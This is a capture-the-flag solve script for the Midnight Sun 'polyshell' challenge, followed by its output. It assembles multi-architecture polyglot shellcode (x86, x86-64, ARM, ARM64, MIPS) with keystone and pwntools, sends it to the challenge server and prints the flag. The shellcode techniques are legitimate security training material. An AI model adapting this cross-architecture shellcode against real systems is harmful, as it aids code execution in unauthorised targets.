from keystone import *
from pwn import *

proc = remote('polyshell-01.play.midnightsunctf.se', 30000)

# Receive the variable input
proc.recvuntil("Syscall number: ") 
syscall = proc.recvline().strip().decode()
proc.recvuntil("Argument 1: ") 
arg1 = proc.recvline().strip().decode()
proc.recvuntil("Argument 2: A pointer to the string \"") 
arg2 = proc.recvline().decode().replace('"',"").strip()

# Print the parameters for reference
print("Syscall:   "+str(syscall))
print("Argument1: "+str(arg1))
print("String:    "+arg2)
print("========================")

def dumpHex(encoding):
    output = ""
    for e in encoding:
        output += "%02X"%e
    return output
    

# x86 syscall
ks_x86 = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks_x86.asm("""
mov eax, {}
mov ebx, {}
call sys
.string "{}"
sys: mov ecx, [esp]
int 0x80
""".format(syscall,arg1,arg2))
len_x86 = len(encoding)
code_x86 = dumpHex(encoding)

# x86_64 syscall
ks_x64 = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks_x64.asm("""
mov rax, {}
mov rdi, {}
call sys
.string "{}"
sys: mov rsi, [rsp]
syscall
""".format(syscall,arg1,arg2))
len_x64 = len(encoding)
code_x64 = dumpHex(encoding)

# ARM syscall
ks_arm = Ks(KS_ARCH_ARM, KS_MODE_ARM+KS_MODE_LITTLE_ENDIAN)
encoding, count = ks_arm.asm("""
add r1, pc, #8
mov r0, #{}
mov r7, #{}
svc #0 
.string "{}"
""".format(arg1,syscall,arg2))
encoding = encoding + ([0x90]*(0x30-len(encoding)))
len_arm = len(encoding)
code_arm = dumpHex(encoding)

# ARM64/Aarch64 syscall
ks_aarch64  = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)
encoding, count = ks_aarch64.asm("""
adr x1, str
mov x0, {}
mov x8, {}
svc 0 
str:
.string "{}"
""".format(arg1,syscall,arg2))
encoding = encoding + ([0x00]*(0x20-len(encoding)))
len_arm64 = len(encoding)
code_arm64 = dumpHex(encoding)

# MIPS syscall (using pwnlib's shellcraft here instead of a self written one)
ks_mips  = Ks(KS_ARCH_MIPS, KS_MODE_MIPS32)
encoding, count = ks_mips.asm(pwnlib.shellcraft.mips.pushstr(arg2)+pwnlib.shellcraft.mips.linux.syscall(int(syscall), int(arg1), "$sp"))
encoding = encoding + ([0x00]*(0x40-len(encoding)))
len_mips = len(encoding)
code_mips = dumpHex(encoding)

x86Filter = "31C040907402EB{}".format(("%02X"%(len_x64))) # x86 / x86_64 splitter by REX NOP INC
sortCode =  "EB120032" # x86/x86_64 jmp to far jump
sortCode2 = "1E000014" # arch branch (jump 0x78)
sortCode3 = "0B000010" # mips branch (jump 0x38)
sortCode4 = "08108FE2" # random instruction for MIPS so it doesn't crash (because branch slots)
sortCode4 = sortCode4 + "210000EA" # b #0x8c
sortCode4 = sortCode4 + "E9B3000000" # JMP 0xb8 (far jump)
sortCode4 = sortCode4 + "00"*(0x30-13)

# MIPS / ARM
#code_arm

outputBytes = sortCode+sortCode2+sortCode3+sortCode4+code_mips+code_arm64+code_arm+x86Filter+code_x64+code_x86

print(outputBytes)
proc.sendline(outputBytes)
proc.interactive()

#Congratulations! Here is your flag: midnight{Its_shellz_all_the_w4y_d0wn}
"""
Syscall:   80
Argument1: 5726
String:    follow
========================
EB1200321E0000140B00001008108FE2210000EAE9B300000000000000000000000000000000000000000000000000000000000000000000000000006C6C093C666F2935F8FFA9AF9088192427482003FCFFA9AFF8FFBD27A1E91924272020032028A003AFFF1924271020030C01010100000000000000000000000081000010C0CB82D2080A80D2010000D4666F6C6C6F770000000000000000000008108FE25E0601E35070A0E3000000EF666F6C6C6F77009090909090909090909090909090909090909090909090909031C040907402EB2048C7C05000000048C7C75E160000E807000000666F6C6C6F7700488B34240F05B850000000BB5E160000E807000000666F6C6C6F77008B0C24CD80

You submit your code as a hex encoded string of max 4096 characters (2048 bytes)

Your shellcode: Results:
x86: Success
x86-64: Success
ARM: Success
ARM64: Success
MIPS: Success

Congratulations! Here is your flag: midnight{Its_shellz_all_the_w4y_d0wn}
"""
